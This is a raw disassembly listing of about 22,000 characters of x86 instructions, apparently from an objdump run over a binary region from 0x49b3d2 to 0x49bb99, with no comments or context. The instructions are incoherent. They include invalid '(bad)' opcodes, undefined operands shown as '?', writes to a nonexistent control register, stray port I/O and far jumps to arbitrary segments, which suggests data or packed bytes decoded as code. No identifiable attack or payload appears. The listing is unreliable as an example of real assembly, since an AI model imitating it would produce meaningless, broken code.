  49b3d2:	mov    al,ds:0x895edd3c
  49b3d7:	sbb    al,0x9b
  49b3d9:	sub    al,0x74
  49b3db:	test   BYTE PTR [ebx-0x11],bh
  49b3de:	mov    bh,BYTE PTR [esi+0x1c]
  49b3e1:	adc    ah,cl
  49b3e3:	inc    esp
  49b3e4:	push   ss
  49b3e5:	adc    edx,DWORD PTR [ecx+0x125ee0d5]
  49b3eb:	xchg   edx,eax
  49b3ec:	inc    ebx
  49b3ed:	add    DWORD PTR [ebx],edx
  49b3ef:	test   BYTE PTR [ebx],bl
  49b3f1:	add    bl,dl
  49b3f3:	fld    QWORD PTR [edi+0x5458a6da]
  49b3f9:	fcomp  DWORD PTR [ebx+0x10]
  49b3fc:	push   ds
  49b3fd:	cmp    al,0x24
  49b3ff:	lahf   
  49b400:	push   ebx
  49b401:	mov    ebx,0x3096c8d
  49b406:	call   DWORD PTR ds:0x6bff628d
  49b40c:	push   ebx
  49b40d:	add    al,0x8e
  49b40f:	shl    BYTE PTR [ebp+0x74eed325],0xe6
  49b416:	rcl    BYTE PTR [edx],cl
  49b418:	inc    esp
  49b419:	jnp    0x49b458
  49b41b:	call   0x334f:0x4c77622a
  49b422:	add    eax,DWORD PTR [ebp-0x238bee05]
  49b428:	push   edx
  49b429:	arpl   WORD PTR [ebx-0x7b],ax
  49b42c:	jl     0x49b3b0
  49b42e:	add    DWORD PTR [edi+edi*4],0x3bafc03
  49b435:	inc    esp
  49b436:	pusha  
  49b437:	mov    DWORD PTR [ebx+eiz*8-0x1a45ff72],eax
  49b43e:	shr    BYTE PTR [ebp+0x51],0x8e
  49b442:	add    edx,DWORD PTR [eax]
  49b444:	data16 test al,0xc0
  49b447:	mov    ebx,0x9711160c
  49b44c:	adc    al,0x5e
  49b44e:	add    eax,0x3293507a
  49b453:	fwait
  49b454:	xchg   ecx,eax
  49b455:	sub    DWORD PTR [edi-0x3851e5fc],edi
  49b45b:	mov    WORD PTR [ecx],es
  49b45d:	test   edx,0x4e04fdfc
  49b463:	sti    
  49b464:	mov    BYTE PTR es:[ecx],bh
  49b467:	mov    cr7,eax
  49b46a:	mov    ebx,0xf5ab9064
  49b46f:	push   es
  49b470:	push   es
  49b471:	xchg   ecx,eax
  49b472:	jno    0x49b4ad
  49b474:	in     al,0x4a
  49b476:	mov    al,ds:0x616f50e
  49b47b:	inc    ecx
  49b47c:	adc    edi,0x6038e1c
  49b482:	adc    DWORD PTR [ebp-0x33fb5efe],ecx
  49b488:	xchg   edx,eax
  49b489:	std    
  49b48a:	in     al,0x2
  49b48c:	ja     0x49b440
  49b48e:	jb     0x49b426
  49b490:	pushw  es
  49b492:	enter  0x166e,0xd3
  49b496:	jnp    0x49b4a6
  49b498:	sbb    DWORD PTR [edx],ebp
  49b49a:	push   cs
  49b49b:	ss ss pop es
  49b49e:	mov    ah,ah
  49b4a0:	and    al,0x6f
  49b4a2:	sub    DWORD PTR [ebx+0x56],0x8e525104
  49b4a9:	add    ecx,eax
  49b4ab:	rcl    DWORD PTR [edx+0x6160ee7],0x14
  49b4b2:	bswap  ebx
  49b4b4:	xchg   DWORD PTR [esi+ecx*1],ecx
  49b4b7:	push   es
  49b4b8:	clc    
  49b4b9:	ins    BYTE PTR es:[edi],dx
  49b4ba:	iret   
  49b4bb:	call   0xcae05ee
  49b4c0:	stc    
  49b4c1:	xchg   ebx,eax
  49b4c2:	sub    eax,0x7804d73b
  49b4c7:	fstp   DWORD PTR [ebp+esi*8-0x3ce38c5]
  49b4ce:	mov    fs,WORD PTR [edx-0x40]
  49b4d1:	add    bl,BYTE PTR [esi-0x710e7063]
  49b4d7:	lahf   
  49b4d8:	push   ss
  49b4d9:	adc    ecx,DWORD PTR [ecx-0x8]
  49b4dc:	sub    eax,0xf503deaa
  49b4e1:	sbb    cl,BYTE PTR [ebp+0x67bd1846]
  49b4e7:	shr    DWORD PTR [edx-0x17],1
  49b4ea:	cld    
  49b4eb:	or     edi,esp
  49b4ed:	push   ebx
  49b4ee:	push   ds
  49b4ef:	dec    esp
  49b4f0:	or     DWORD PTR [edi+0x227b1031],ecx
  49b4f6:	or     eax,DWORD PTR [ebp+ebp*2+0xd]
  49b4fa:	jbe    0x49b53d
  49b4fc:	jmp    0x49b55a
  49b4fe:	adc    al,0x70
  49b500:	adc    al,dh
  49b502:	cmp    DWORD PTR ds:0x30dd02,esi
  49b508:	cmp    bl,0x7a
  49b50b:	rcl    bh,0xcc
  49b50e:	push   0x31668394
  49b513:	cmp    BYTE PTR [esp+esi*2],al
  49b516:	adc    al,0x31
  49b518:	daa    
  49b519:	or     DWORD PTR [eax-0x648d42cf],edi
  49b51f:	imul   ebp,DWORD PTR [edx],0x18184c83
  49b525:	sbb    al,0x8c
  49b527:	leave  
  49b528:	xor    esi,DWORD PTR [edx+0x72]
  49b52b:	sbb    al,0x58
  49b52d:	sbb    al,0x58
  49b52f:	daa    
  49b530:	and    eax,DWORD PTR [edi]
  49b532:	add    ch,0xe2
  49b535:	sti    
  49b536:	cmc    
  49b537:	pop    DWORD PTR [ecx+0x2f90725b]
  49b53d:	(bad)  
  49b53e:	das    
  49b53f:	sbb    eax,esp
  49b541:	fld    QWORD PTR [edx+0x443da20]
  49b547:	jae    0x49b4d1
  49b549:	and    DWORD PTR [ebp+ecx*1+0x68],ecx
  49b54d:	sbb    cl,0x8b
  49b550:	fimul  WORD PTR ds:0x48884d4c
  49b556:	inc    edx
  49b557:	pop    esi
  49b558:	mov    ds:0x4ac61143,al
  49b55d:	aaa    
  49b55e:	adc    cl,BYTE PTR [ecx+0xe]
  49b561:	js     0x49b525
  49b563:	add    ebx,DWORD PTR [ebp+0x52]
  49b566:	add    al,0xcb
  49b568:	pop    ds
  49b569:	adc    BYTE PTR [ecx-0xefaec8c],dh
  49b56f:	pop    es
  49b570:	test   BYTE PTR [ebx],al
  49b572:	mov    esi,0x848bf6b0
  49b577:	sub    eax,0xe750a190
  49b57c:	jge    0x49b510
  49b57e:	sti    
  49b57f:	pop    DWORD PTR [edi-0x3fc909cd]
  49b585:	dec    edi
  49b586:	nop
  49b587:	xchg   DWORD PTR [ebx],edx
  49b589:	push   cs
  49b58a:	cmp    eax,0xd07c3f3
  49b58f:	sub    cl,ah
  49b591:	inc    esi
  49b592:	cmp    esi,DWORD PTR [ecx+ecx*1+0x41950172]
  49b599:	sub    BYTE PTR [eax+eiz*4-0x5ee6d2ae],cl
  49b5a0:	dec    edi
  49b5a1:	pusha  
  49b5a2:	sbb    eax,DWORD PTR [ebp+0x9]
  49b5a5:	push   edi
  49b5a6:	jo     0x49b568
  49b5a8:	nop
  49b5a9:	cmp    BYTE PTR [ebx+0x1e],0xb0
  49b5ad:	and    dh,bl
  49b5af:	add    esp,DWORD PTR [ebp-0x12734c21]
  49b5b5:	adc    BYTE PTR [ecx+0x18273bce],0xbc
  49b5bc:	arpl   di,si
  49b5be:	cmp    BYTE PTR [esi+0x78],0xf6
  49b5c2:	test   DWORD PTR [ebx],edx
  49b5c4:	nop
  49b5c5:	ja     0x49b604
  49b5c7:	cmp    ebx,DWORD PTR [edi]
  49b5c9:	jb     0x49b5e2
  49b5cb:	call   0x1c41706a
  49b5d0:	stos   DWORD PTR es:[edi],eax
  49b5d1:	mov    ?,WORD PTR [eax]
  49b5d3:	bswap  esi
  49b5d5:	enter  0x9d71,0xcc
  49b5d9:	sub    al,0x7c
  49b5db:	adc    eax,0x91432bf5
  49b5e0:	loope  0x49b5d3
  49b5e2:	sub    BYTE PTR [edx+eax*2+0xb],dh
  49b5e6:	cs addr16 add dh,cl
  49b5ea:	aad    0x8d
  49b5ec:	push   es
  49b5ed:	ins    DWORD PTR es:[edi],dx
  49b5ee:	inc    ecx
  49b5ef:	cmp    ebx,DWORD PTR [ecx+0x6a]
  49b5f2:	cld    
  49b5f3:	in     eax,dx
  49b5f4:	les    ecx,FWORD PTR [ebx+0x27]
  49b5f7:	shr    DWORD PTR [eax],cl
  49b5f9:	ret    
  49b5fa:	iret   
  49b5fb:	test   ah,0x71
  49b5fe:	ret    0xcb41
  49b601:	adc    eax,esi
  49b603:	jge    0x49b633
  49b605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49b606:	adc    ebp,DWORD PTR [edi-0x6e3c03d5]
  49b60c:	cmp    esp,DWORD PTR [edx+0x3]
  49b60f:	shl    DWORD PTR [edx+eiz*8+0x28],0xc2
  49b614:	fidivr WORD PTR [ecx+0x4037c2dd]
  49b61a:	push   esi
  49b61b:	jbe    0x49b686
  49b61d:	xchg   DWORD PTR [edx+0x3],eax
  49b620:	ficomp WORD PTR [ebp-0x22ee81d9]
  49b626:	push   es
  49b627:	dec    ebx
  49b628:	and    al,BYTE PTR [eax+0x11]
  49b62b:	cmp    dl,BYTE PTR [ecx+0x39]
  49b62e:	mov    edx,0x433610af
  49b633:	inc    ecx
  49b634:	mov    esp,0x7d95f257
  49b639:	jge    0x49b643
  49b63b:	jg     0x49b699
  49b63d:	sbb    eax,0xf3c035c2
  49b642:	xchg   ebp,eax
  49b643:	push   ss
  49b644:	add    BYTE PTR [ecx-0xe],0x81
  49b648:	(bad)  
  49b64b:	dec    edx
  49b64c:	sub    dl,BYTE PTR [ebx]
  49b64e:	push   edi
  49b64f:	in     al,0x8a
  49b651:	push   es
  49b652:	mov    BYTE PTR [edi+0x47210e10],bl
  49b658:	pop    esi
  49b659:	daa    
  49b65a:	sub    DWORD PTR [ecx+0x26879187],edx
  49b660:	fs loop 0x49b627
  49b663:	push   ss
  49b664:	and    eax,0x25bc1b2a
  49b669:	ret    
  49b66a:	cmc    
  49b66b:	ss push es
  49b66d:	mov    ch,0x53
  49b66f:	pop    DWORD PTR [ebx+0x214e2370]
  49b675:	cmp    DWORD PTR ss:[ebx+ecx*1-0x6e],esi
  49b67a:	pop    esp
  49b67b:	test   DWORD PTR ds:0x97ee840d,edx
  49b681:	mov    al,ds:0x9f913973
  49b686:	shl    BYTE PTR [ebp+0x10],0x74
  49b68a:	or     al,0xa3
  49b68c:	xchg   ecx,eax
  49b68d:	and    dl,bl
  49b68f:	icebp  
  49b690:	mov    ds,WORD PTR [edi]
  49b692:	fcmovnb st,st(0)
  49b694:	(bad)  
  49b695:	arpl   WORD PTR [eax+0x14],cx
  49b698:	mov    eax,ebp
  49b69a:	mov    dh,0xef
  49b69c:	dec    ebx
  49b69d:	mov    bh,0x94
  49b69f:	sub    ebp,DWORD PTR [ecx-0x497ebd8a]
  49b6a5:	inc    ecx
  49b6a6:	dec    esp
  49b6a7:	and    esi,edx
  49b6a9:	xor    bl,BYTE PTR [eax+ebp*1+0x7a1bb4a4]
  49b6b0:	adc    DWORD PTR ds:0xc81bc091,edi
  49b6b6:	jmp    0x49b63e
  49b6b8:	rcl    BYTE PTR [edi],cl
  49b6ba:	and    edx,DWORD PTR [ecx-0x437c1729]
  49b6c0:	call   0x46796f57
  49b6c5:	sub    al,0xfe
  49b6c7:	mov    ecx,DWORD PTR [esi+0x20]
  49b6ca:	scas   eax,DWORD PTR es:[edi]
  49b6cb:	ret    
  49b6cc:	fnstenv es:[ecx]
  49b6cf:	sar    edx,0x46
  49b6d2:	ret    0x92b5
  49b6d5:	rcl    DWORD PTR cs:[esi+0x3520746c],cl
  49b6dc:	ret    0x2afa
  49b6df:	lea    esi,[ecx-0x3a]
  49b6e2:	frstor [edx]
  49b6e4:	aaa    
  49b6e5:	sbb    BYTE PTR [edx+0x32da9d98],cl
  49b6eb:	adc    eax,ecx
  49b6ed:	and    BYTE PTR [ebp-0x436f0581],al
  49b6f3:	mov    ebp,0x132a3d15
  49b6f8:	arpl   WORD PTR [ebx+0xc],ax
  49b6fb:	popa   
  49b6fc:	dec    ecx
  49b6fd:	add    eax,ebx
  49b6ff:	push   esp
  49b700:	pushf  
  49b701:	sub    eax,0x1a53fc90
  49b706:	cwde   
  49b707:	mov    esi,0x93399441
  49b70c:	cli    
  49b70d:	std    
  49b70e:	push   ds
  49b70f:	js     0x49b6a4
  49b711:	xchg   DWORD PTR [edx+0x3121794],edx
  49b717:	int3   
  49b718:	mov    eax,ecx
  49b71a:	test   eax,0xcb547d09
  49b71f:	(bad)  [esi+0x5]
  49b722:	and    DWORD PTR [ecx],ebp
  49b724:	dec    ecx
  49b725:	cmp    BYTE PTR [edi],cl
  49b727:	iret   
  49b728:	mov    eax,DWORD PTR [eax-0x4a]
  49b72b:	mov    dl,0x16
  49b72d:	test   dh,ah
  49b72f:	pop    ss
  49b730:	mov    ds:0x30570293,eax
  49b735:	jb     0x49b77f
  49b737:	xchg   ebx,eax
  49b738:	sbb    esp,DWORD PTR [ebp-0x58daf4bd]
  49b73e:	cmp    ah,BYTE PTR [eax]
  49b740:	xchg   ebx,eax
  49b741:	dec    ebx
  49b742:	mov    ds:0x8299faa8,eax
  49b747:	xchg   edi,eax
  49b748:	in     al,0x93
  49b74a:	dec    ebx
  49b74b:	push   ss
  49b74c:	adc    eax,DWORD PTR [ebx+0xb]
  49b74f:	mov    edx,0x7d6d4c15
  49b754:	imul   eax,DWORD PTR [ebx+0x28],0xa72f3805
  49b75b:	mov    ds:0xaf0efa76,eax
  49b760:	shl    BYTE PTR [eax+0x4e8ffbfb],0x11
  49b767:	test   BYTE PTR ds:0x43891389,ah
  49b76d:	jnp    0x49b7dc
  49b76f:	fld    QWORD PTR [edi+ebp*1-0x2a26f1f2]
  49b776:	lods   eax,DWORD PTR ds:[esi]
  49b777:	sbb    dh,BYTE PTR [ebx-0x2c5e2fd9]
  49b77d:	jno    0x49b749
  49b77f:	lods   al,BYTE PTR ds:[esi]
  49b780:	mov    ecx,0x799b772f
  49b785:	xchg   ebx,eax
  49b786:	ins    DWORD PTR es:[edi],dx
  49b787:	adc    esp,DWORD PTR [eax-0x5f]
  49b78a:	cmp    eax,0xe48e55e1
  49b78f:	xchg   ebx,eax
  49b790:	ins    DWORD PTR es:[edi],dx
  49b791:	adc    eax,0xf97945b4
  49b796:	out    0x75,al
  49b798:	out    dx,eax
  49b799:	cdq    
  49b79a:	mov    eax,ds:0x8968247c
  49b79f:	add    eax,eax
  49b7a1:	stc    
  49b7a2:	ja     0x49b7c4
  49b7a4:	ins    BYTE PTR es:[edi],dx
  49b7a5:	setae  BYTE PTR [ecx+0x61]
  49b7a9:	push   0xa1d330a3
  49b7ae:	add    ebx,DWORD PTR [ebp+ebx*2+0x13]
  49b7b2:	push   esi
  49b7b3:	mov    edi,DWORD PTR [esi+0x5e]
  49b7b6:	push   ss
  49b7b7:	and    al,0x92
  49b7b9:	stc    
  49b7ba:	out    dx,al
  49b7bb:	mov    dl,BYTE PTR [eax+ecx*4+0x4065bd13]
  49b7c2:	inc    esi
  49b7c3:	sbb    BYTE PTR [ebx],dl
  49b7c5:	aas    
  49b7c6:	cs mov ebx,0x496d76ea
  49b7cc:	imul   edx,DWORD PTR [ebx+0xc],0x65
  49b7d0:	adc    al,0xbc
  49b7d2:	into   
  49b7d3:	shl    DWORD PTR [esi],0xa4
  49b7d6:	jae    0x49b79c
  49b7d8:	dec    edx
  49b7d9:	jle    0x49b848
  49b7db:	xchg   edi,eax
  49b7dc:	outs   dx,DWORD PTR ds:[esi]
  49b7dd:	sub    BYTE PTR [edx+0x28187afe],bh
  49b7e3:	jno    0x49b835
  49b7e5:	push   ecx
  49b7e6:	imul   eax,DWORD PTR [edx],0xffffffa6
  49b7e9:	(bad)  
  49b7eb:	xchg   ebx,eax
  49b7ec:	ins    DWORD PTR es:[edi],dx
  49b7ed:	mov    esi,0xe095c189
  49b7f2:	xlat   BYTE PTR ds:[ebx]
  49b7f3:	ins    BYTE PTR es:[edi],dx
  49b7f4:	imul   eax,DWORD PTR [ecx],0x41
  49b7f7:	imul   edi,DWORD PTR [ebx],0xffffffc8
  49b7fa:	jne    0x49b7c1
  49b7fc:	test   BYTE PTR [ebp+0x52],bh
  49b7ff:	jne    0x49b810
  49b801:	pop    esp
  49b802:	bound  ecx,QWORD PTR [ebp+0x41e80e97]
  49b808:	and    BYTE PTR [ecx+0x3c6b213e],0x22
  49b80f:	aad    0xce
  49b811:	mov    DWORD PTR [ecx-0xa],esp
  49b814:	mov    al,ds:0x93c54784
  49b819:	cdq    
  49b81a:	out    dx,al
  49b81b:	pop    ds
  49b81c:	je     0x49b82c
  49b81e:	cli    
  49b81f:	add    DWORD PTR [si+0x50a3],edx
  49b824:	mov    ecx,ebx
  49b826:	mov    edi,DWORD PTR [ecx]
  49b828:	aad    0x1d
  49b82a:	dec    eax
  49b82b:	xor    ebp,DWORD PTR [eax]
  49b82d:	out    dx,eax
  49b82e:	pop    edi
  49b82f:	daa    
  49b830:	cmp    edx,edx
  49b832:	push   0xf8d6fa7b
  49b837:	add    edx,DWORD PTR [eax+0x5e]
  49b83a:	jb     0x49b820
  49b83c:	and    eax,0xf8d93a94
  49b841:	xchg   esp,eax
  49b842:	cmp    ch,BYTE PTR [ebx+0x16497aa9]
  49b848:	or     esp,ebp
  49b84a:	add    edi,DWORD PTR [edi+0x69]
  49b84d:	jns    0x49b881
  49b84f:	mov    ch,0x7d
  49b851:	call   0xb8f8:0xaf1dd5a3
  49b858:	mov    DWORD PTR [ebp+esi*8+0xbc89465],eax
  49b85f:	add    ebx,DWORD PTR [ebx]
  49b861:	sub    DWORD PTR [eax+0x2c],edi
  49b864:	stc    
  49b865:	push   ds
  49b866:	push   esi
  49b867:	push   esi
  49b868:	popf   
  49b869:	cld    
  49b86a:	pop    ebx
  49b86b:	mov    dl,0x41
  49b86d:	mov    ds:0x8259d8b,al
  49b872:	stc    
  49b873:	xor    ah,BYTE PTR [edx+0x3b]
  49b876:	or     BYTE PTR [eax-0x73],0x2f
  49b87a:	cld    
  49b87b:	popf   
  49b87c:	mov    ds,eax
  49b87e:	sbb    ch,BYTE PTR [edi*8+0xe4ebc97]
  49b885:	cmp    DWORD PTR [eax],ecx
  49b887:	aas    
  49b888:	cld    
  49b889:	mov    WORD PTR [edx+0x48f7f0b],?
  49b88f:	iret   
  49b890:	cmp    BYTE PTR [ebp+0x148c3927],dl
  49b896:	mov    eax,0x6895cd3b
  49b89b:	(bad)  
  49b89d:	sbb    DWORD PTR [edi-0x57],edx
  49b8a0:	sbb    al,0x72
  49b8a2:	sub    eax,0x84af545f
  49b8a7:	sbb    al,0x4
  49b8a9:	xchg   esi,eax
  49b8aa:	pusha  
  49b8ab:	outs   dx,DWORD PTR ds:[esi]
  49b8ac:	dec    ebx
  49b8ad:	jl     0x49b82f
  49b8af:	and    dh,BYTE PTR [esi-0x3ed07d40]
  49b8b5:	mov    gs:0xcbadc8ad,al
  49b8bb:	dec    ecx
  49b8bc:	add    bh,BYTE PTR [ebx]
  49b8be:	dec    eax
  49b8bf:	or     bl,bl
  49b8c1:	mov    ds:0x6d7534b,eax
  49b8c6:	mov    bl,0x1
  49b8c8:	xor    esp,DWORD PTR [eax-0x53]
  49b8cb:	xor    BYTE PTR [ebp-0x3ec4d30a],bl
  49b8d1:	jl     0x49b91a
  49b8d3:	mov    cl,0x38
  49b8d5:	xchg   BYTE PTR [ebp+0x6d],bl
  49b8d8:	and    al,0xd7
  49b8da:	xchg   ecx,eax
  49b8db:	push   edi
  49b8dc:	sbb    ebp,DWORD PTR [ecx]
  49b8de:	pop    eax
  49b8df:	cwde   
  49b8e0:	adc    eax,0x652b3bd8
  49b8e5:	addr16 dec ebp
  49b8e7:	xchg   DWORD PTR [ecx],edi
  49b8e9:	dec    esp
  49b8ea:	dec    ebp
  49b8eb:	inc    esp
  49b8ec:	cmp    DWORD PTR [eax+0x28],ebx
  49b8ef:	push   ds
  49b8f0:	xor    al,0xb7
  49b8f2:	mov    edi,0x5e3b23f7
  49b8f7:	enter  0x381c,0x17
  49b8fb:	push   ebx
  49b8fc:	inc    edi
  49b8fd:	xchg   ebp,eax
  49b8fe:	out    dx,eax
  49b8ff:	mov    esp,0x15e409c
  49b904:	clc    
  49b905:	xchg   esi,eax
  49b906:	das    
  49b907:	add    al,0xf8
  49b909:	adc    eax,0x969390f2
  49b90e:	das    
  49b90f:	xchg   esi,eax
  49b910:	das    
  49b911:	sub    DWORD PTR [ebx],ebx
  49b913:	shl    DWORD PTR [eax+0x292fc57d],0x47
  49b91a:	or     BYTE PTR [ecx],0x70
  49b91d:	or     BYTE PTR [edx],bl
  49b91f:	lea    eax,[esi+0x4]
  49b922:	rcl    BYTE PTR [ebx],0x6c
  49b925:	pop    edi
  49b926:	xchg   edx,eax
  49b927:	(bad)  
  49b928:	outs   dx,DWORD PTR ds:[esi]
  49b929:	add    al,BYTE PTR [edi-0x6a]
  49b92c:	pop    ebx
  49b92d:	repnz cdq 
  49b92f:	idiv   BYTE PTR [ecx-0x640b5dbf]
  49b935:	jmp    0xde79:0xe9ace06
  49b93c:	rcr    DWORD PTR [ebp+0x7d2b2736],cl
  49b942:	push   es
  49b943:	int3   
  49b944:	xlat   BYTE PTR ds:[ebx]
  49b945:	jns    0x49b8e1
  49b947:	dec    edi
  49b948:	repz add al,0x9c
  49b94b:	ins    BYTE PTR es:[edi],dx
  49b94c:	aas    
  49b94d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49b94e:	xor    BYTE PTR [eax-0xd],cl
  49b951:	mov    esp,0xa15bf6d9
  49b956:	dec    esi
  49b957:	pop    edx
  49b958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49b959:	daa    
  49b95a:	push   ecx
  49b95b:	push   es
  49b95c:	call   0xeecf:0xbbed9ae5
  49b963:	sbb    DWORD PTR [esi-0x5c97f982],esp
  49b969:	inc    esi
  49b96a:	add    ch,BYTE PTR [ecx-0x1330c1e6]
  49b970:	repz push es
  49b972:	sub    BYTE PTR [ecx-0x57],bh
  49b975:	daa    
  49b976:	imul   edi,DWORD PTR [edi-0x1dbd55ee],0x3c
  49b97d:	out    dx,eax
  49b97e:	test   BYTE PTR [esi],0x4c
  49b981:	mov    bl,0x4b
  49b983:	or     DWORD PTR [ecx+0x53530190],edi
  49b989:	dec    esi
  49b98a:	and    al,0xf0
  49b98c:	in     eax,0x4
  49b98e:	sbb    ah,BYTE PTR [ebx+0xb]
  49b991:	cld    
  49b992:	mov    eax,ds:0xe97b4d1a
  49b997:	xchg   edx,eax
  49b998:	push   0x648f01cc
  49b99d:	adc    BYTE PTR [ebx+0x5246bf03],cl
  49b9a3:	rcl    al,cl
  49b9a5:	xor    eax,0xde41e9c1
  49b9aa:	inc    edx
  49b9ab:	adc    dl,ah
  49b9ad:	add    BYTE PTR [esi-0x38],0x83
  49b9b1:	sub    BYTE PTR [eax],bl
  49b9b3:	loopne 0x49b973
  49b9b5:	js     0x49b938
  49b9b7:	xchg   DWORD PTR [ecx-0x7d7d8620],edx
  49b9bd:	and    eax,0xb0910f2b
  49b9c2:	xchg   DWORD PTR [bp+si-0x6b],ebx
  49b9c6:	pop    esi
  49b9c7:	push   eax
  49b9c8:	les    eax,FWORD PTR [edi]
  49b9ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49b9cb:	in     eax,dx
  49b9cc:	push   ebx
  49b9cd:	and    al,0x48
  49b9cf:	popa   
  49b9d0:	sub    al,0x8
  49b9d2:	test   BYTE PTR [ecx],bl
  49b9d4:	jmp    0x92d7:0xbf7677b1
  49b9db:	sbb    eax,DWORD PTR [edi+eax*4]
  49b9de:	mov    ds:0x369184f0,eax
  49b9e3:	xchg   BYTE PTR [ecx+0xb770065],al
  49b9e9:	pop    esp
  49b9ea:	mov    BYTE PTR [edi+eiz*2+0x4],al
  49b9ee:	int3   
  49b9ef:	sub    BYTE PTR [bx+di-0x7e],bl
  49b9f3:	rcl    DWORD PTR [edx+0xf],cl
  49b9f6:	mov    al,BYTE PTR [edx]
  49b9f8:	jle    0x49b9c7
  49b9fa:	ja     0x49ba6a
  49b9fc:	cmp    esi,DWORD PTR [ebp+0x60]
  49b9ff:	lock xor eax,0x60e7c0ea
  49ba05:	mov    ecx,0x7ec10128
  49ba0a:	in     eax,0xb1
  49ba0c:	pop    edi
  49ba0d:	adc    bl,bh
  49ba0f:	lock add eax,0x264bde0f
  49ba15:	push   ecx
  49ba16:	push   ebx
  49ba17:	and    DWORD PTR [esi],eax
  49ba19:	jnp    0x49ba25
  49ba1b:	xchg   esi,eax
  49ba1c:	test   BYTE PTR ds:0x97591170,bh
  49ba22:	sar    edx,cl
  49ba24:	adc    al,0x30
  49ba26:	and    BYTE PTR [ecx-0x1e9baa3c],bh
  49ba2c:	aaa    
  49ba2d:	pop    esp
  49ba2e:	and    BYTE PTR [esp+eax*1-0x7eda3e78],dh
  49ba35:	pusha  
  49ba36:	rcl    DWORD PTR [edx-0x4f696910],cl
  49ba3c:	push   cs
  49ba3d:	pop    ss
  49ba3e:	sar    BYTE PTR [eax+0xd],1
  49ba41:	ins    DWORD PTR es:[edi],dx
  49ba42:	xor    bh,BYTE PTR [edi+0x2907ff8e]
  49ba48:	push   ss
  49ba49:	dec    esi
  49ba4a:	dec    ecx
  49ba4b:	test   DWORD PTR [ebx-0x657f8122],ebp
  49ba51:	dec    ebp
  49ba52:	pop    es
  49ba53:	dec    edi
  49ba54:	fld    QWORD PTR [eax]
  49ba56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49ba57:	fstp   QWORD PTR [esp+0xc]
  49ba5b:	leave  
  49ba5c:	or     DWORD PTR [eax+0x40],eax
  49ba5f:	aaa    
  49ba60:	xchg   al,al
  49ba62:	fimul  DWORD PTR [esi+0x7d]
  49ba65:	lahf   
  49ba66:	sbb    al,BYTE PTR [eax+0x15163e12]
  49ba6c:	popf   
  49ba6d:	sub    ah,BYTE PTR [edi]
  49ba6f:	loopne 0x49ba0b
  49ba71:	cdq    
  49ba72:	ror    DWORD PTR [ebp*1-0x2b178543],0x1b
  49ba7a:	jnp    0x49ba8d
  49ba7c:	mul    edi
  49ba7e:	jbe    0x49babf
  49ba80:	popf   
  49ba81:	mov    WORD PTR [edi+0x289c7543],?
  49ba87:	fcomp  DWORD PTR [edi+0x6f092d5]
  49ba8d:	or     al,0x56
  49ba8f:	dec    edx
  49ba90:	xchg   BYTE PTR [edx+edx*8+0x3c98210a],bl
  49ba97:	repnz add BYTE PTR [eax],al
  49ba9a:	cmp    DWORD PTR [esi+0x75000ac5],0x50
  49baa1:	ret    0x7d9
  49baa4:	add    DWORD PTR [ebx+0xc9c1311],edi
  49baaa:	pop    ebx
  49baab:	mov    ds:0x5575695,eax
  49bab0:	mov    ebx,0x94151a76
  49bab5:	push   eax
  49bab6:	jns    0x49bacb
  49bab8:	jne    0x3cbcc6c3
  49babe:	add    ecx,DWORD PTR [ecx+0x6a60d20]
  49bac4:	ror    DWORD PTR [ebx+0x51],0x6e
  49bac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49bac9:	das    
  49baca:	push   edi
  49bacb:	(bad)  
  49bacc:	cld    
  49bacd:	push   ss
  49bace:	and    DWORD PTR [esi+0x1422108b],0xb182b424
  49bad8:	and    DWORD PTR [eax],eax
  49bada:	dec    esp
  49badb:	add    al,0xc
  49badd:	or     BYTE PTR [esi],bl
  49badf:	mov    cs,WORD PTR ds:0xc890ae1
  49bae5:	jmp    DWORD PTR [ebx+0x78c02be6]
  49baeb:	std    
  49baec:	shr    BYTE PTR [esp+esi*1+0x296c107b],0x63
  49baf4:	pop    es
  49baf5:	adc    BYTE PTR [edi-0x25b8f6df],bh
  49bafb:	adc    cl,BYTE PTR ss:[esi+0x41]
  49baff:	mov    ebx,0x618fd54
  49bb04:	inc    eax
  49bb05:	push   es
  49bb06:	fs inc eax
  49bb08:	add    al,BYTE PTR [ebx]
  49bb0a:	mov    edi,0xf6494a7
  49bb0f:	add    DWORD PTR [edi],esp
  49bb11:	ja     0xdb47b0be
  49bb17:	push   ebp
  49bb18:	push   ds
  49bb19:	sbb    ah,ah
  49bb1b:	xchg   BYTE PTR [esi+ebp*2+0x4108660c],bh
  49bb22:	xchg   ecx,eax
  49bb23:	fs inc eax
  49bb25:	or     dl,bl
  49bb27:	outs   dx,BYTE PTR ds:[esi]
  49bb28:	pop    ebx
  49bb29:	adc    al,0x2b
  49bb2b:	sbb    BYTE PTR [ebx+edi*1+0x44],al
  49bb2f:	push   ecx
  49bb30:	dec    eax
  49bb31:	add    ah,BYTE PTR [edx+0x3c7c44fa]
  49bb37:	inc    edx
  49bb38:	dec    esp
  49bb39:	add    DWORD PTR [eax-0x7daadfb4],ecx
  49bb3f:	aaa    
  49bb40:	test   DWORD PTR [ecx-0x3aa781fd],edi
  49bb46:	mov    al,0xf7
  49bb48:	inc    esi
  49bb49:	mov    edi,0x1a1ac3e0
  49bb4e:	push   es
  49bb4f:	dec    esi
  49bb50:	pop    esi
  49bb51:	hlt    
  49bb52:	jp     0x49bb8c
  49bb54:	or     al,0x2c
  49bb56:	mov    dl,BYTE PTR [ebx]
  49bb58:	loope  0x49bb82
  49bb5a:	mov    BYTE PTR [ecx],dl
  49bb5c:	test   al,0xd0
  49bb5e:	out    0xba,eax
  49bb60:	test   BYTE PTR [ecx-0xfa2e7bc],al
  49bb66:	add    ebx,0x9ee086e2
  49bb6c:	ret    
  49bb6d:	add    DWORD PTR [edi],ebp
  49bb6f:	ret    
  49bb70:	xor    ecx,edi
  49bb72:	jg     0x49bb35
  49bb74:	rcl    BYTE PTR [edx+ebx*8-0x1d],cl
  49bb78:	jmp    0x33c3:0xfc529b42
  49bb7f:	loope  0x49bb8a
  49bb81:	ret    
  49bb82:	mov    ebx,0xdc3512af
  49bb87:	leave  
  49bb88:	bound  esi,QWORD PTR [ebx+0x5066a309]
  49bb8e:	mov    BYTE PTR [edi+0x450d0813],dh
  49bb94:	mov    eax,ds:0x7f0bf3a9
  49bb99:	iret   
